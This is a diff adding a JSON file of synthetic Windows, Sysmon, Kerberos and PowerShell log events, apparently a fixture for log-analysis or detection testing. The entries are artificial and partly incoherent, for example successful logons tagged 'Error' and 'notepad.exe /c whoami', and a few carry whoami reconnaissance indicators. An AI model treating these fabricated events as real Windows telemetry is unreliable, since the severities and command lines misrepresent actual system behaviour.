+    "timestamp": "2025-08-18T00:59:00Z",
+    "host": "DC01",
+    "user": "svc_backup",
+    "source": "PowerShell",
+    "event_id": 4103,
+    "level": "Information",
+    "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "command_line": "powershell.exe -NoProfile -Command \"Get-Process | Select-Object -First 3\"",
+    "message": "Module logging: PowerShell command started.",
+    "tags": [
+      "powershell",
+      "module"
+    ]
+  },
+  {
+    "id": 59,
+    "timestamp": "2025-08-18T00:58:00Z",
+    "host": "DC01",
+    "user": "jdoe",
+    "source": "WindowsSecurity",
+    "event_id": 4688,
+    "level": "Information",
+    "image": "C:\\Windows\\System32\\notepad.exe",
+    "command_line": "C:\\Windows\\System32\\notepad.exe /c whoami",
+    "message": "A new process has been created.",
+    "tags": [
+      "process",
+      "create"
+    ]
+  },
+  {
+    "id": 58,
+    "timestamp": "2025-08-18T00:57:00Z",
+    "host": "WS02",
+    "user": "jdoe",
+    "source": "WindowsSecurity",
+    "event_id": 4624,
+    "level": "Information",
+    "message": "An account was successfully logged on.",
+    "tags": [
+      "logon",
+      "success"
+    ]
+  },
+  {
+    "id": 57,
+    "timestamp": "2025-08-18T00:56:00Z",
+    "host": "DC01",
+    "user": "svc_sql",
+    "source": "WindowsSecurity",
+    "event_id": 4624,
+    "level": "Information",
+    "message": "An account was successfully logged on.",
+    "tags": [
+      "logon",
+      "success"
+    ]
+  },
+  {
+    "id": 56,
+    "timestamp": "2025-08-18T00:55:00Z",
+    "host": "FILE01",
+    "user": "msmith",
+    "source": "Kerberos",
+    "event_id": 4768,
+    "level": "Information",
+    "message": "A Kerberos authentication ticket (TGT) was requested.",
+    "tags": [
+      "kerberos",
+      "tgt"
+    ]
+  },
+  {
+    "id": 55,
+    "timestamp": "2025-08-18T00:54:00Z",
+    "host": "FILE01",
+    "user": "svc_sql",
+    "source": "PowerShell",
+    "event_id": 4103,
+    "level": "Error",
+    "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "command_line": "powershell.exe -NoProfile -Command \"Get-Process | Select-Object -First 3\"",
+    "message": "Module logging: PowerShell command started.",
+    "tags": [
+      "powershell",
+      "module"
+    ]
+  },
+  {
+    "id": 54,
+    "timestamp": "2025-08-18T00:53:00Z",
+    "host": "WEB01",
+    "user": "svc_backup",
+    "source": "Sysmon",
+    "event_id": 3,
+    "level": "Error",
+    "message": "Network connection detected.",
+    "tags": [
+      "sysmon",
+      "net"
+    ]
+  },
+  {
+    "id": 53,
+    "timestamp": "2025-08-18T00:52:00Z",
+    "host": "DC01",
+    "user": "svc_backup",
+    "source": "Kerberos",
+    "event_id": 4768,
+    "level": "Information",
+    "message": "A Kerberos authentication ticket (TGT) was requested.",
+    "tags": [
+      "kerberos",
+      "tgt"
+    ]
+  },
+  {
+    "id": 52,
+    "timestamp": "2025-08-18T00:51:00Z",
+    "host": "FILE01",
+    "user": "svc_sql",
+    "source": "Kerberos",
+    "event_id": 4768,
+    "level": "Information",
+    "message": "A Kerberos authentication ticket (TGT) was requested.",
+    "tags": [
+      "kerberos",
+      "tgt"
+    ]
+  },
+  {
+    "id": 51,
+    "timestamp": "2025-08-18T00:50:00Z",
+    "host": "SQL01",
+    "user": "svc_sql",
+    "source": "Kerberos",
+    "event_id": 4768,
+    "level": "Information",
+    "message": "A Kerberos authentication ticket (TGT) was requested.",
+    "tags": [
+      "kerberos",
+      "tgt"
+    ]
+  },
+  {
+    "id": 50,
+    "timestamp": "2025-08-18T00:49:00Z",
+    "host": "WEB01",
+    "user": "guest",
+    "source": "WindowsSecurity",
+    "event_id": 4688,
+    "level": "Warning",
+    "image": "C:\\Windows\\System32\\rundll32.exe",
+    "command_line": "C:\\Windows\\System32\\rundll32.exe /c whoami",
+    "message": "A new process has been created.",
+    "tags": [
+      "process",
+      "create"
+    ]
+  },
+  {
+    "id": 49,
+    "timestamp": "2025-08-18T00:48:00Z",
+    "host": "DC01",
+    "user": "guest",
+    "source": "Kerberos",
+    "event_id": 4769,
+    "level": "Warning",
+    "message": "A Kerberos service ticket was requested.",
+    "tags": [
+      "kerberos",
+      "tgs"
+    ]
+  },
+  {
+    "id": 48,
+    "timestamp": "2025-08-18T00:47:00Z",
+    "host": "WS02",
+    "user": "jdoe",
+    "source": "PowerShell",
+    "event_id": 4103,
+    "level": "Information",
+    "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "command_line": "powershell.exe -NoProfile -Command \"Get-Process | Select-Object -First 3\"",
+    "message": "Module logging: PowerShell command started.",
+    "tags": [
+      "powershell",
+      "module"
+    ]
+  },
+  {
+    "id": 47,
+    "timestamp": "2025-08-18T00:46:00Z",
+    "host": "WEB01",
+    "user": "svc_backup",
+    "source": "Kerberos",
+    "event_id": 4768,
+    "level": "Information",
+    "message": "A Kerberos authentication ticket (TGT) was requested.",
+    "tags": [
+      "kerberos",
+      "tgt"
+    ]
+  },
+  {
+    "id": 46,
+    "timestamp": "2025-08-18T00:45:00Z",
+    "host": "WS02",
+    "user": "svc_sql",
+    "source": "Sysmon",
+    "event_id": 1,
+    "level": "Information",
+    "image": "C:\\Program Files\\7-Zip\\7z.exe",
+    "command_line": "C:\\Program Files\\7-Zip\\7z.exe /?",
+    "message": "Process Create detected.",
+    "tags": [
+      "sysmon",
+      "proc"
+    ]
+  },
+  {
+    "id": 45,
+    "timestamp": "2025-08-18T00:44:00Z",
+    "host": "WS01",
+    "user": "jdoe",
+    "source": "WindowsSecurity",
+    "event_id": 4624,
+    "level": "Error",
+    "message": "An account was successfully logged on.",
+    "tags": [
+      "logon",
+      "success"
+    ]
+  },
+  {
+    "id": 44,
+    "timestamp": "2025-08-18T00:43:00Z",
+    "host": "FILE01",
+    "user": "jdoe",
+    "source": "Sysmon",
+    "event_id": 3,
+    "level": "Information",
+    "message": "Network connection detected.",
+    "tags": [
+      "sysmon",
+      "net"
+    ]
+  },
+  {
+    "id": 43,
+    "timestamp": "2025-08-18T00:42:00Z",
+    "host": "WS02",
+    "user": "svc_backup",
+    "source": "Sysmon",
+    "event_id": 1,
+    "level": "Information",
+    "image": "C:\\Windows\\System32\\wscript.exe",
+    "command_line": "C:\\Windows\\System32\\wscript.exe /?",
+    "message": "Process Create detected.",
+    "tags": [
+      "sysmon",
+      "proc"
+    ]
+  },
+  {
+    "id": 42,
+    "timestamp": "2025-08-18T00:41:00Z",
+    "host": "WEB01",
+    "user": "guest",
+    "source": "Kerberos",
+    "event_id": 4769,
+    "level": "Information",
+    "message": "A Kerberos service ticket was requested.",
+    "tags": [
+      "kerberos",
+      "tgs"
+    ]
+  },
+  {
+    "id": 41,
+    "timestamp": "2025-08-18T00:40:00Z",
+    "host": "SQL01",
+    "user": "msmith",
+    "source": "WindowsSecurity",
+    "event_id": 4624,
+    "level": "Information",
+    "message": "An account was successfully logged on.",
+    "tags": [
+      "logon",
+      "success"
+    ]
+  },
+  {
+    "id": 40,
+    "timestamp": "2025-08-18T00:39:00Z",
+    "host": "WS01",
+    "user": "svc_sql",
+    "source": "WindowsSecurity",
+    "event_id": 4625,
+    "level": "Information",
+    "message": "An account failed to log on.",
+    "tags": [
+      "logon",
+      "failed"
+    ]
+  },
+  {
+    "id": 39,
+    "timestamp": "2025-08-18T00:38:00Z",
+    "host": "WS01",
+    "user": "svc_sql",
+    "source": "Sysmon",
+    "event_id": 7,
+    "level": "Information",
+    "message": "Image loaded.",
+    "tags": [
+      "sysmon",
+      "image"
+    ]
+  },
+  {
+    "id": 38,
+    "timestamp": "2025-08-18T00:37:00Z",
+    "host": "WEB01",
+    "user": "msmith",
+    "source": "Kerberos",
+    "event_id": 4769,
+    "level": "Information",
+    "message": "A Kerberos service ticket was requested.",
+    "tags": [
+      "kerberos",
+      "tgs"
+    ]
+  },
+  {
+    "id": 37,
+    "timestamp": "2025-08-18T00:36:00Z",
+    "host": "WEB01",
+    "user": "msmith",
+    "source": "Kerberos",
+    "event_id": 4769,
+    "level": "Error",
+    "message": "A Kerberos service ticket was requested.",
+    "tags": [
+      "kerberos",
+      "tgs"
+    ]
+  },
+  {
+    "id": 36,
+    "timestamp": "2025-08-18T00:35:00Z",
+    "host": "FILE01",
+    "user": "Administrator",
+    "source": "Sysmon",
+    "event_id": 3,
+    "level": "Information",
+    "message": "Network connection detected.",
+    "tags": [
+      "sysmon",
+      "net"
+    ]
+  },
+  {
+    "id": 35,
+    "timestamp": "2025-08-18T00:34:00Z",
+    "host": "WS01",
+    "user": "msmith",
+    "source": "WindowsSecurity",
+    "event_id": 4624,
+    "level": "Information",
+    "message": "An account was successfully logged on.",
+    "tags": [
+      "logon",
+      "success"
+    ]
+  },
+  {
+    "id": 34,
+    "timestamp": "2025-08-18T00:33:00Z",
+    "host": "WEB01",
+    "user": "guest",
+    "source": "Sysmon",
+    "event_id": 7,
+    "level": "Information",
+    "message": "Image loaded.",
+    "tags": [
+      "sysmon",
+      "image"
+    ]
+  },
+  {
+    "id": 33,
+    "timestamp": "2025-08-18T00:32:00Z",
+    "host": "WS02",
+    "user": "svc_sql",
+    "source": "Kerberos",
+    "event_id": 4768,
+    "level": "Error",
+    "message": "A Kerberos authentication ticket (TGT) was requested.",
+    "tags": [
+      "kerberos",
+      "tgt"
+    ]
+  },
+  {
+    "id": 32,
+    "timestamp": "2025-08-18T00:31:00Z",
+    "host": "FILE01",
+    "user": "Administrator",
+    "source": "Sysmon",
+    "event_id": 1,
+    "level": "Error",
+    "image": "C:\\Windows\\System32\\wscript.exe",
+    "command_line": "C:\\Windows\\System32\\wscript.exe /?",
+    "message": "Process Create detected.",
+    "tags": [
+      "sysmon",
+      "proc"
+    ]
+  },
+  {
+    "id": 31,
+    "timestamp": "2025-08-18T00:30:00Z",
+    "host": "WEB01",
+    "user": "svc_sql",
+    "source": "Sysmon",
+    "event_id": 1,
+    "level": "Information",
+    "image": "C:\\Program Files\\7-Zip\\7z.exe",
+    "command_line": "C:\\Program Files\\7-Zip\\7z.exe /?",
+    "message": "Process Create detected.",
+    "tags": [
+      "sysmon",
+      "proc"
+    ]
+  },
+  {
+    "id": 30,
+    "timestamp": "2025-08-18T00:29:00Z",
+    "host": "WS02",
+    "user": "svc_sql",
+    "source": "Sysmon",
+    "event_id": 3,
+    "level": "Warning",
+    "message": "Network connection detected.",
+    "tags": [
+      "sysmon",
+      "net"
+    ]
+  },
+  {
+    "id": 29,
+    "timestamp": "2025-08-18T00:28:00Z",
+    "host": "DC01",
+    "user": "svc_backup",
+    "source": "Kerberos",
+    "event_id": 4768,
+    "level": "Warning",
+    "message": "A Kerberos authentication ticket (TGT) was requested.",
+    "tags": [
+      "kerberos",
+      "tgt"
+    ]
+  },
+  {
+    "id": 28,
+    "timestamp": "2025-08-18T00:27:00Z",
+    "host": "DC01",
+    "user": "svc_backup",
+    "source": "PowerShell",
+    "event_id": 4103,
+    "level": "Information",
+    "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "command_line": "powershell.exe -NoProfile -Command \"Get-Process | Select-Object -First 3\"",
+    "message": "Module logging: PowerShell command started.",
+    "tags": [
+      "powershell",
+      "module"
+    ]
+  },
+  {
+    "id": 27,
+    "timestamp": "2025-08-18T00:26:00Z",
+    "host": "WS01",
+    "user": "msmith",
+    "source": "Kerberos",
+    "event_id": 4769,
+    "level": "Warning",
+    "message": "A Kerberos service ticket was requested.",
+    "tags": [
+      "kerberos",
+      "tgs"
+    ]
+  },
+  {
+    "id": 26,
+    "timestamp": "2025-08-18T00:25:00Z",
+    "host": "FILE01",
+    "user": "Administrator",
+    "source": "Sysmon",
+    "event_id": 3,
+    "level": "Warning",
+    "message": "Network connection detected.",
+    "tags": [
+      "sysmon",
+      "net"
+    ]
+  },
+  {
+    "id": 25,
+    "timestamp": "2025-08-18T00:24:00Z",
+    "host": "WS02",
+    "user": "guest",
+    "source": "Sysmon",
+    "event_id": 7,
+    "level": "Information",
+    "message": "Image loaded.",
+    "tags": [
+      "sysmon",
+      "image"
+    ]
+  },
+  {
+    "id": 24,
+    "timestamp": "2025-08-18T00:23:00Z",
+    "host": "WEB01",
+    "user": "svc_backup",
+    "source": "WindowsSecurity",
+    "event_id": 4624,
+    "level": "Information",
+    "message": "An account was successfully logged on.",
+    "tags": [
+      "logon",
+      "success"
+    ]
+  },
+  {
+    "id": 23,
+    "timestamp": "2025-08-18T00:22:00Z",
+    "host": "DC01",
+    "user": "svc_backup",
+    "source": "Kerberos",
+    "event_id": 4768,
+    "level": "Warning",
+    "message": "A Kerberos authentication ticket (TGT) was requested.",
+    "tags": [
+      "kerberos",
+      "tgt"
+    ]
+  },
+  {
+    "id": 22,
+    "timestamp": "2025-08-18T00:21:00Z",
+    "host": "WS01",
+    "user": "guest",
+    "source": "WindowsSecurity",
+    "event_id": 4625,
+    "level": "Error",
+    "message": "An account failed to log on.",
+    "tags": [
+      "logon",
+      "failed"
+    ]
+  },
+  {
+    "id": 21,
+    "timestamp": "2025-08-18T00:20:00Z",
+    "host": "WS01",
+    "user": "svc_backup",
+    "source": "Sysmon",
+    "event_id": 1,
+    "level": "Information",
+    "image": "C:\\Program Files\\7-Zip\\7z.exe",
+    "command_line": "C:\\Program Files\\7-Zip\\7z.exe /?",
+    "message": "Process Create detected.",
+    "tags": [
+      "sysmon",
+      "proc"
+    ]
+  },
+  {
+    "id": 20,
+    "timestamp": "2025-08-18T00:19:00Z",
+    "host": "WEB01",
+    "user": "msmith",
+    "source": "PowerShell",
+    "event_id": 4103,
+    "level": "Information",
+    "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "command_line": "powershell.exe -NoProfile -Command \"Get-Process | Select-Object -First 3\"",
+    "message": "Module logging: PowerShell command started.",
+    "tags": [
+      "powershell",
+      "module"
+    ]
+  },
+  {
+    "id": 19,
+    "timestamp": "2025-08-18T00:18:00Z",
+    "host": "FILE01",
+    "user": "msmith",
+    "source": "WindowsSecurity",
+    "event_id": 4688,
+    "level": "Information",
+    "image": "C:\\Windows\\System32\\rundll32.exe",
+    "command_line": "C:\\Windows\\System32\\rundll32.exe /c whoami",
+    "message": "A new process has been created.",
+    "tags": [
+      "process",
+      "create"
+    ]
+  },
+  {
+    "id": 18,
+    "timestamp": "2025-08-18T00:17:00Z",
+    "host": "WS01",
+    "user": "guest",
+    "source": "WindowsSecurity",
+    "event_id": 4624,
+    "level": "Error",
+    "message": "An account was successfully logged on.",
+    "tags": [
+      "logon",
+      "success"
+    ]
+  },
+  {
+    "id": 17,
+    "timestamp": "2025-08-18T00:16:00Z",
+    "host": "WEB01",
+    "user": "Administrator",
+    "source": "Kerberos",
+    "event_id": 4768,
+    "level": "Information",
+    "message": "A Kerberos authentication ticket (TGT) was requested.",
+    "tags": [
+      "kerberos",
+      "tgt"
+    ]
+  },
+  {
+    "id": 16,
+    "timestamp": "2025-08-18T00:15:00Z",
+    "host": "SQL01",
+    "user": "Administrator",
+    "source": "Sysmon",
+    "event_id": 1,
+    "level": "Information",
+    "image": "C:\\Windows\\System32\\conhost.exe",
+    "command_line": "C:\\Windows\\System32\\conhost.exe /?",
+    "message": "Process Create detected.",
+    "tags": [
+      "sysmon",
+      "proc"
+    ]
+  },
+  {
+    "id": 15,
+    "timestamp": "2025-08-18T00:14:00Z",
+    "host": "FILE01",
+    "user": "svc_sql",
+    "source": "Kerberos",
+    "event_id": 4769,
+    "level": "Information",
+    "message": "A Kerberos service ticket was requested.",
+    "tags": [
+      "kerberos",
+      "tgs"
+    ]
+  },
+  {
+    "id": 14,
+    "timestamp": "2025-08-18T00:13:00Z",
+    "host": "SQL01",
+    "user": "svc_backup",
+    "source": "Kerberos",
+    "event_id": 4768,
+    "level": "Information",
+    "message": "A Kerberos authentication ticket (TGT) was requested.",
+    "tags": [
+      "kerberos",
+      "tgt"
+    ]
+  },
+  {
+    "id": 13,
+    "timestamp": "2025-08-18T00:12:00Z",
+    "host": "SQL01",
+    "user": "msmith",
+    "source": "WindowsSecurity",
+    "event_id": 4625,
+    "level": "Error",
+    "message": "An account failed to log on.",
+    "tags": [
+      "logon",
+      "failed"
+    ]
+  },
+  {
+    "id": 12,
+    "timestamp": "2025-08-18T00:11:00Z",
+    "host": "DC01",
+    "user": "msmith",
+    "source": "Sysmon",
+    "event_id": 7,
+    "level": "Warning",
+    "message": "Image loaded.",
+    "tags": [
+      "sysmon",
+      "image"
+    ]
+  },
+  {
+    "id": 11,
+    "timestamp": "2025-08-18T00:10:00Z",
+    "host": "FILE01",
+    "user": "guest",
+    "source": "Sysmon",
+    "event_id": 7,
+    "level": "Information",
+    "message": "Image loaded.",
+    "tags": [
+      "sysmon",
+      "image"
+    ]
+  },
+  {
+    "id": 10,
+    "timestamp": "2025-08-18T00:09:00Z",
+    "host": "FILE01",
+    "user": "msmith",
+    "source": "WindowsSecurity",
+    "event_id": 4625,
+    "level": "Information",
+    "message": "An account failed to log on.",
+    "tags": [
+      "logon",
+      "failed"
+    ]
+  },
+  {
+    "id": 9,
+    "timestamp": "2025-08-18T00:08:00Z",
+    "host": "WEB01",
+    "user": "svc_backup",
+    "source": "WindowsSecurity",
+    "event_id": 4624,
+    "level": "Information",
+    "message": "An account was successfully logged on.",
+    "tags": [
+      "logon",
+      "success"
+    ]
+  },
+  {
+    "id": 8,
+    "timestamp": "2025-08-18T00:07:00Z",
+    "host": "DC01",
+    "user": "jdoe",
+    "source": "WindowsSecurity",
+    "event_id": 4624,
+    "level": "Error",
+    "message": "An account was successfully logged on.",
+    "tags": [
+      "logon",
+      "success"
+    ]
+  },
+  {
+    "id": 7,
+    "timestamp": "2025-08-18T00:06:00Z",
+    "host": "WEB01",
+    "user": "guest",
+    "source": "WindowsSecurity",
+    "event_id": 4624,
+    "level": "Warning",
+    "message": "An account was successfully logged on.",
+    "tags": [
+      "logon",
+      "success"
+    ]
+  },
+  {
+    "id": 6,
+    "timestamp": "2025-08-18T00:05:00Z",
+    "host": "WS01",
+    "user": "jdoe",
+    "source": "WindowsSecurity",
+    "event_id": 4688,
+    "level": "Error",
+    "image": "C:\\Windows\\System32\\notepad.exe",
+    "command_line": "C:\\Windows\\System32\\notepad.exe /c whoami",
+    "message": "A new process has been created.",
+    "tags": [
+      "process",
+      "create"
+    ]
+  },
+  {
+    "id": 5,
+    "timestamp": "2025-08-18T00:04:00Z",
+    "host": "DC01",
+    "user": "guest",
+    "source": "WindowsSecurity",
+    "event_id": 4688,
+    "level": "Information",
+    "image": "C:\\Windows\\System32\\rundll32.exe",
+    "command_line": "C:\\Windows\\System32\\rundll32.exe /c whoami",
+    "message": "A new process has been created.",
+    "tags": [
+      "process",
+      "create"
+    ]
+  },
+  {
+    "id": 4,
+    "timestamp": "2025-08-18T00:03:00Z",
+    "host": "FILE01",
+    "user": "Administrator",
+    "source": "Kerberos",
+    "event_id": 4768,
+    "level": "Information",
+    "message": "A Kerberos authentication ticket (TGT) was requested.",
+    "tags": [
+      "kerberos",
+      "tgt"
+    ]
+  },
+  {
+    "id": 3,
+    "timestamp": "2025-08-18T00:02:00Z",
+    "host": "WS01",
+    "user": "guest",
+    "source": "WindowsSecurity",
+    "event_id": 4624,
+    "level": "Information",
+    "message": "An account was successfully logged on.",
+    "tags": [
+      "logon",
+      "success"
+    ]
+  },
+  {
+    "id": 2,
+    "timestamp": "2025-08-18T00:01:00Z",
+    "host": "WS01",
+    "user": "guest",
+    "source": "Kerberos",
+    "event_id": 4769,
+    "level": "Warning",
+    "message": "A Kerberos service ticket was requested.",
+    "tags": [
+      "kerberos",
+      "tgs"
+    ]
+  },
+  {
+    "id": 1,
+    "timestamp": "2025-08-18T00:00:00Z",
+    "host": "FILE01",
+    "user": "svc_backup",
+    "source": "Sysmon",
+    "event_id": 7,
+    "level": "Information",
+    "message": "Image loaded.",
+    "tags": [
+      "sysmon",
+      "image"
+    ]
+  }
+]
